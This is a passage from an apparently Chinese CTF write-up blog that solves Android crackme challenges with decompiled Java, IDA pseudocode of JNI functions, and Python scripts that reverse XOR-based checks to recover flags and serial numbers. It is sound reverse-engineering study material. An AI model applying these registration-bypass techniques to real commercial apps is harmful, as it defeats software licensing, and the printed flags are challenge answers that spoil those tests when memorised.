ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = &#39;&#39;.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a</code></pre><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><pre><code class="java">package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity {    EditText etFlag;    public native String encrypt(String str);    public native String getFlag();    static {        System.loadLibrary(&quot;phcm&quot;);    }    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.etFlag = (EditText) findViewById(R.id.flag_edit);    }    public void onGoClick(View v) {        if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) {            Toast.makeText(this, &quot;Success&quot;, 1).show();        } else {            Toast.makeText(this, &quot;Failed&quot;, 1).show();        }    }    public String getSecret(String string) { // 获取某种哈希摘要的十六进制字符串        try {            byte[] hash = MessageDigest.getInstance(encrypt(&quot;KE3TLNE6M43EK4GM34LKMLETG&quot;).substring(5, 8)).digest(string.getBytes(&quot;UTF-8&quot;));            if (hash != null) {                StringBuilder hex = new StringBuilder(hash.length * 2);                for (byte b : hash) {                    if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) {                        hex.append(&quot;0&quot;);                    }                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));                }                return hex.toString();            }        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();        } catch (UnsupportedEncodingException e2) {            e2.printStackTrace();        }        return null;    }}</code></pre><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *v3; // r6  const char *v4; // r4  const char *i; // r5  v3 = a1;  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  for ( i = v4; i - v4 &lt; strlen(v4); ++i )    --*i;  return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);}</code></pre><p>反向加一，得到指定的哈希摘要是 MD5：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = &#39;KE3TLNE6M43EK4GM34LKMLETG&#39;digest_type = &#39;&#39;for i in range(len(secret_digest)):    digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5</code></pre><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1){  char *v1; // r4  _JNIEnv *v2; // r7  char *v3; // r3  int v4; // r0  int v5; // r1  char *v6; // r2  char *v7; // r3  int v8; // r0  int v9; // r1  int v10; // r4  int v11; // r0  __int16 v12; // r3  signed int l1; // r8  signed int l2; // r0  char *v15; // r9  char a; // r3  char b; // t1  int idx; // r1  char s; // [sp+4h] [bp-5Ch]  char data_1[40]; // [sp+14h] [bp-4Ch]  char v22; // [sp+40h] [bp-20h]  v1 = data_1;  v2 = a1;  v3 = (char *)&amp;data;  do  {    v4 = *(_DWORD *)v3;                         // low 4 bytes    v3 += 8;    v5 = *((_DWORD *)v3 - 1);                   // high 4 bytes    *(_DWORD *)v1 = v4;    *((_DWORD *)v1 + 1) = v5;    v1 += 8;  }  while ( v3 != &quot;Hello Ph0en1x&quot; );  v6 = &amp;s;  v7 = &quot;Hello Ph0en1x&quot;;  do  {    v8 = *(_DWORD *)v7;    v7 += 8;    v9 = *((_DWORD *)v7 - 1);    *(_DWORD *)v6 = v8;    *((_DWORD *)v6 + 1) = v9;    v10 = (int)(v6 + 8);    v6 += 8;  }  while ( v7 != &quot;0en1x&quot; );  v11 = *(_DWORD *)v7;  v12 = *((_WORD *)v7 + 2);  *(_DWORD *)v10 = v11;  *(_WORD *)(v10 + 4) = v12;  l1 = strlen(&amp;s);                              // len(&#39;Hello Ph0en1x&#39;)  l2 = strlen(data_1) - 1;                      // len(data) - 1  v15 = &amp;data_1[l2];  while ( l2 &gt; 0 )  {    a = *v15 + 1;    *v15 = a;                                   // data[l2] = data[l2] + 1    b = *(v15-- - 1);                           // data[l2 - 1]    idx = l2-- % l1;                            // l2 % l1    v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1  }  data_1[0] = (data_1[0] ^ 0x48) - 1;  return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);}</code></pre><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><pre><code class="python">data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = &#39;Hello Ph0en1x&#39;l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1):    data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = &#39;&#39;.join([chr(c + 1) for c in data])print flag# flag{Ar3_y0u_go1nG_70_scarborough_Fair}</code></pre><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><pre><code class="java">package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity {    private Button btn_register;    private EditText edit_sn;    private EditText edit_userName;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        setTitle(R.string.unregister);        this.edit_userName = (EditText) findViewById(R.id.edit_username);        this.edit_sn = (EditText) findViewById(R.id.edit_sn);        this.btn_register = (Button) findViewById(R.id.button_register);        this.btn_register.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) {                    Toast.makeText(MainActivity.this, R.string.successed, 0).show();                    MainActivity.this.btn_register.setEnabled(false);                    MainActivity.this.setTitle(R.string.registered);                    return;                }                Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show();            }        });    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.activity_main, menu);        return true;    }    private boolean checkSN(String userName, String sn) {        try {            if (userName.length() == 0 &amp;&amp; sn.length() == 0) {                return true;            }            if (userName == null || userName.length() == 0) {                return false;            }            if (sn == null || sn.length() != 16) {                return false;            }            MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);            digest.reset();            digest.update(userName.getBytes());            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);            StringBuilder sb = new StringBuilder();            for (int i = 0; i &lt; hexstr.length(); i += 2) {                sb.append(hexstr.charAt(i));            }            if (sb.toString().equalsIgnoreCase(sn)) {                return true;            }            return false;        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return false;        }    }    private static String toHexString(byte[] bytes, String separator) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);            if (hex.length() == 1) {                hexString.append(&#39;0&#39;);            }            hexString.append(hex).append(separator);        }        return hexString.toString();    }}</code></pre><p>在资源中找到指定的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt;    &lt;string name=&quot;app_name&quot;&gt;Crackme0201&lt;/string&gt;    &lt;string name=&quot;hint_sn&quot;&gt;请输入16位的注册码&lt;/string&gt;    &lt;string name=&quot;hint_username&quot;&gt;请输入用户名&lt;/string&gt;    &lt;string name=&quot;info&quot;&gt;Xman Android&lt;/string&gt;    &lt;string name=&quot;menu_settings&quot;&gt;Settings&lt;/string&gt;    &lt;string name=&quot;register&quot;&gt;注 册&lt;/string&gt;    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;    &lt;string name=&quot;sn&quot;&gt;注册码：&lt;/string&gt;    &lt;string name=&quot;successed&quot;&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt;    &lt;string name=&quot;title_activity_main&quot;&gt;Crackme&lt;/string&gt;    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;    &lt;string name=&quot;unsuccessed&quot;&gt;无效用户名或注册码&lt;/string&gt;    &lt;string name=&quot;username&quot;&gt;用户名：&lt;/string&gt;&lt;/resources&gt;</code></pre><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity {    private static String workString;    private Button btn1;    public void onCreate(Bundle savedInstanceState) {        String str2;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String str1 = &quot;Xman&quot;;        Log.d(&quot;com.gdufs.xman m=&quot;, str1);        MyApp myApp = (MyApp) getApplication();        int m = MyApp.m;        if (m == 0) {            str2 = &quot;\u672a\u6ce8\u518c&quot;; // 未注册        } else if (m == 1) {            str2 = &quot;\u5df2\u6ce8\u518c&quot;; // 已注册        } else {            str2 = &quot;\u5df2\u6df7\u4e71&quot;; // 已混乱        }        setTitle(str1 + str2);        this.btn1 = (Button) findViewById(R.id.button1);        this.btn1.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                MyApp myApp = (MyApp) MainActivity.this.getApplication();                if (MyApp.m == 0) {                    MainActivity.this.doRegister();                    return;                }                ((MyApp) MainActivity.this.getApplication()).work();                Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show();            }        });    }    public void doRegister() {        new Builder(this).setTitle(&quot;\u6ce8\u518c&quot;).setMessage(&quot;Flag\u5c31\u5728\u524d\u65b9\uff01&quot;).setPositiveButton(&quot;\u6ce8\u518c&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册            public void onClick(DialogInterface dialog, int which) {                Intent intent = new Intent();                intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, &quot;com.gdufs.xman.RegActivity&quot;));                MainActivity.this.startActivity(intent); // 跳转到RegActivity                MainActivity.this.finish();            }        }).setNegativeButton(&quot;\u4e0d\u73a9\u4e86&quot;, new DialogInterface.OnClickListener() { // NagetiveButton =&gt; 不玩了            public void onClick(DialogInterface dialog, int which) {                Process.killProcess(Process.myPid());            }        }).show();    }    public void work(String str) {        workString = str;    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }}</code></pre><p>然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><pre><code class="java">package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application {    public static int m = 0;    public native void initSN();    public native void saveSN(String str);    public native void work();    static {        System.loadLibrary(&quot;myjni&quot;);    }    public void onCreate() {        initSN();        Log.d(&quot;com.gdufs.xman m=&quot;, String.valueOf(m));        super.onCreate();    }}</code></pre><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity {    private Button btn_reg;    private EditText edit_sn;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_reg);        this.btn_reg = (Button) findViewById(R.id.button1);        this.edit_sn = (EditText) findViewById(R.id.editText1);        this.btn_reg.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                String sn = RegActivity.this.edit_sn.getText().toString().trim();                if (sn == null || sn.length() == 0) {                    Toast.makeText(RegActivity.this, &quot;\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a&quot;, 0).show(); // 您的输入为空                    return;                }                ((MyApp) RegActivity.this.getApplication()).saveSN(sn);                new Builder(RegActivity.this).setTitle(&quot;\u56de\u590d&quot;).setMessage(&quot;\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58&quot;).setPositiveButton(&quot;\u597d\u5427&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧                    public void onClick(DialogInterface dialog, int which) {                        Process.killProcess(Process.myPid());                    }                }).show();            }        });    }}</code></pre><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *a1){  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) )    return -1;  _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;JNI_OnLoad()&quot;);  native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods  {    _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() ok&quot;);    return 65542;  }  _android_log_print(6, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() failed&quot;);  return -1;}</code></pre><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><pre><code class="cpp">void __fastcall initSN(_JNIEnv *a1){  _JNIEnv *env; // r6  FILE *f; // r0  FILE *f_1; // r4  _JNIEnv *env_1; // r0  int v5; // r1  int len; // r7  char *data; // r5  _JNIEnv *env_2; // r0  int v9; // r1  env = a1;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;r+&quot;);  f_1 = f;  if ( !f )                                     // read file error  {    env_1 = env;    v5 = (int)f_1;LABEL_5:    setValue(env_1, v5);    return;  }  fseek(f, 0, 2);                               // seek to file end ( SEEK_END )  len = ftell(f_1);  data = (char *)malloc(len + 1);               // malloc error  if ( !data )  {    fclose(f_1);    env_1 = env;    v5 = 0;    goto LABEL_5;  }  fseek(f_1, 0, 0);                             // seek to file start ( SEEK_SET )  fread(data, len, 1u, f_1);  data[len] = 0;  if ( !strcmp(data, &quot;EoPAoY62@ElRD&quot;) )  {    env_2 = env;    v9 = 1;  }  else  {    env_2 = env;    v9 = 0;  }  setValue(env_2, v9);  j_fclose(f_1);}</code></pre><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><pre><code class="cpp">void __fastcall setValue(_JNIEnv *a1, int val){  int val_1; // r7  _JNIEnv *v3; // r4  jclass v4; // r0  void *v5; // r5  struct _jfieldID *v6; // r0  val_1 = val;  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v5 = v4;  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, &quot;m&quot;, &quot;I&quot;);  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val}</code></pre><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><pre><code class="cpp">int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *env; // r6  jstring str; // r9  FILE *v5; // r7  int *v7; // r4  const char *v8; // r3  int v9; // r0  int v10; // r1  _WORD *v11; // r5  JNIEnv *v12; // r0  int i; // r4  const struct JNINativeInterface *v14; // r3  signed int j; // r6  const char *utf_string; // r9  const char *data; // r5  signed int len; // r10  char val; // r2  char tmp; // r3  int v21; // [sp+0h] [bp-38h]  int v22; // [sp+14h] [bp-24h]  char v23; // [sp+18h] [bp-20h]  env = a1;  str = a3;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;w+&quot;);  if ( f )  {    v7 = &amp;v21;    v8 = &quot;W3_arE_whO_we_ARE&quot;;    do    {      v9 = *(_DWORD *)v8;      v8 += 8;      v10 = *((_DWORD *)v8 - 1);      *v7 = v9;      v7[1] = v10;      v11 = v7 + 2;      v7 += 2;    }    while ( v8 != &quot;E&quot; );    v12 = &amp;env-&gt;functions;    i = 2016;    *v11 = *(_WORD *)v8;    v14 = env-&gt;functions;    j = 0;    utf_string = v14-&gt;GetStringUTFChars(v12, str, 0);    data = utf_string;    len = strlen(utf_string);    while ( j &lt; len )    {      if ( j % 3 == 1 )      {        i = (i + 5) % 16;        val = *(&amp;v23 + i - 23);                 // &amp;v23 - 32 = &amp;&quot;3_arE_whO_we_ARE&quot;      }      else if ( j % 3 == 2 )      {        i = (i + 7) % 15;        val = *(&amp;v23 + i - 22);                 // &amp;v23 - 22 = &amp;&quot;_arE_whO_we_ARE&quot;      }      else      {        i = (i + 3) % 13;        val = *(&amp;v23 + i - 21);                 // &amp;v23 - 21 = &amp;&quot;arE_whO_we_ARE&quot;      }      tmp = *data;      ++j;      *((_BYTE *)++data - 1) = tmp ^ val;    }    fputs(utf_string, f);  }  else if ( v22 == _stack_chk_guard )  {    return j___android_log_print(3, &quot;com.gdufs.xman&quot;, &amp;unk_2DCA);  }  return j_fclose(f);}</code></pre><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><pre><code class="cpp">void __fastcall work(_JNIEnv *a1){  _JNIEnv *env; // r4  jint m; // r0  _JNIEnv *env_1; // r0  void *v4; // r1  bool v5; // zf  env = a1;  initSN(a1);  m = getValue(env);  if ( m )  {    v5 = m == 1;    env_1 = env;    if ( v5 )      v4 = &amp;unk_2E6B;                           // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]    else      v4 = &amp;unk_2E95;                           // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]  }  else  {    env_1 = env;    v4 = &amp;unk_2E5B;                             // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]  }  callWork(env_1, (int)v4);}</code></pre><p>其中 getValue 就是获取 m 的值：</p><pre><code class="cpp">jint __fastcall getValue(_JNIEnv *a1){  _JNIEnv *v1; // r4  jclass v2; // r0  void *v3; // r5  struct _jfieldID *v4; // r0  v1 = a1;  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v3 = v2;  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, &quot;m&quot;, &quot;I&quot;);  return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m&#39;s value}</code></pre><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><pre><code class="cpp">void __fastcall callWork(_JNIEnv *a1, void *a2){  const char *v2; // r8  _JNIEnv *env; // r4  jclass v4; // r0  void *v5; // r5  struct _jmethodID *v6; // r0  jobject v7; // r7  struct _jmethodID *v8; // r5  void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6  jstring v10; // r0  v2 = (const char *)a2;  env = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MainActivity&quot;);  v5 = v4;  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, &quot;work&quot;, &quot;(Ljava/lang/String;)V&quot;);  if ( v8 )  {    v9 = env-&gt;functions-&gt;CallVoidMethod;    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);    v9(&amp;env-&gt;functions, v7, v8, v10);  }}</code></pre><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;EoPAoY62@ElRD&#39;key = &#39;W3_arE_whO_we_ARE&#39;i = 2016j = 0l = len(ciphertext)result = &#39;&#39;while j &lt; l:    if j % 3 == 1:        i = (i + 5) % 16        val = ord(key[i + 1])    elif j % 3 ==2:        i = (i + 7) % 15        val = ord(key[i + 2])    else:        i = (i + 3) % 13        val = ord(key[i + 3])    result += chr(ord(ciphertext[j]) ^ val)    j += 1print result</code></pre><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.a.sample.findmydex&quot; platformBuildVersionCode=&quot;24&quot; platformBuildVersionName=&quot;7.0&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;  &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;24&quot; /&gt;  &lt;application android:allowBackup=&quot;false&quot; android:fullBackupContent=&quot;false&quot; android:hasCode=&quot;false&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;    &lt;activity android:configChanges=&quot;0xa0&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;android.app.NativeActivity&quot;&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;native&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;    &lt;activity android:name=&quot;com.a.sample.findmydex.MainActivity&quot;&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;com.a.sample.findmydex.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>看了一下 Java 只有一个类：</p><pre><code class="java">class Placeholder {    Placeholder() {        super();    }}</code></pre><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><pre><code class="cpp">int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3){  _DWORD *v3; // r8  int savedState; // r10  size_t savedStateSize; // r9  int activity; // r0  __int64 v7; // r2  char *v8; // r5  void *v9; // r0  int *v10; // r0  char *v11; // r0  pthread_attr_t attr; // [sp+4h] [bp-30h]  v3 = a1;  savedState = a2;  savedStateSize = a3;  activity = *a1;  *(_DWORD *)(activity + 20) = sub_3000;  *(_DWORD *)activity = sub_305A;  *(_DWORD *)(activity + 4) = sub_3062;  *(_DWORD *)(activity + 8) = sub_306A;  *(_DWORD *)(activity + 12) = sub_30BE;  HIDWORD(v7) = sub_30EE;  *(_DWORD *)(activity + 16) = sub_30C6;  LODWORD(v7) = sub_30DE;  *(_DWORD *)(activity + 56) = sub_30CE;  *(_DWORD *)(activity + 60) = sub_30D6;  *(_QWORD *)(activity + 24) = v7;  *(_DWORD *)(activity + 40) = sub_30F4;  *(_DWORD *)(activity + 44) = sub_30FC;  *(_DWORD *)(activity + 48) = sub_3102;  v8 = (char *)malloc(0x94u);  _aeabi_memclr4();  *((_DWORD *)v8 + 3) = v3;  pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0);  pthread_cond_init((pthread_cond_t *)(v8 + 68), 0);  if ( savedState )  {    v9 = malloc(savedStateSize);    *((_DWORD *)v8 + 5) = v9;    *((_DWORD *)v8 + 6) = savedStateSize;    _aeabi_memcpy(v9, savedState, savedStateSize);  }  if ( pipe(&amp;attr.__align + 6) )  {    v10 = (int *)_errno();    v11 = strerror(*v10);    _android_log_print(6, &quot;threaded_app&quot;, &quot;could not create pipe: %s&quot;, v11);    v8 = 0;  }  else  {    *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3);    pthread_attr_init(&amp;attr);    pthread_attr_setdetachstate(&amp;attr, 1);    pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8);    pthread_mutex_lock((pthread_mutex_t *)(v8 + 64));    while ( !*((_DWORD *)v8 + 27) )      pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64));    pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64));  }  v3[7] = v8;  return _stack_chk_guard - *(&amp;attr.__align + 8);}</code></pre><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><pre><code class="cpp">int __fastcall android_app_entry(int a1){  int v1; // r4  int v2; // r1  int v3; // r5  int result; // r0  char v5; // [sp+8h] [bp-14h]  char v6; // [sp+Ah] [bp-12h]  int v7; // [sp+Ch] [bp-10h]  v1 = a1;  *(_DWORD *)(a1 + 16) = AConfiguration_new();  v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32);  AConfiguration_fromAssetManager();  AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6);  AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5);  *(_DWORD *)(v1 + 84) = 1;  *(_DWORD *)(v1 + 88) = v1;  *(_DWORD *)(v1 + 92) = sub_3344;  *(_DWORD *)(v1 + 96) = 2;  *(_DWORD *)(v1 + 100) = v1;  *(_DWORD *)(v1 + 104) = sub_3370;  v3 = ALooper_prepare(1);  ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84);  *(_DWORD *)(v1 + 28) = v3;  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  *(_DWORD *)(v1 + 108) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  j_android_main(v1);  android_app_destroy(v1);  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  if ( *(_DWORD *)(v1 + 32) )    AInputQueue_detachLooper();  AConfiguration_delete(*(_DWORD *)(v1 + 16));  *(_DWORD *)(v1 + 116) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  result = _stack_chk_guard - v7;  if ( _stack_chk_guard == v7 )    result = 0;  return result;}</code></pre><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><pre><code class="cpp">  *(_DWORD *)filename = 0x9D888DC6;  *(_DWORD *)&amp;filename[4] = 0x888DC688;  *(_DWORD *)&amp;filename[8] = 0x8AC6889D;  *(_DWORD *)&amp;filename[12] = 0x88C78486;  *(_DWORD *)&amp;filename[16] = 0x84889AC7;  *(_DWORD *)&amp;filename[20] = 0xC78C8599;  *(_DWORD 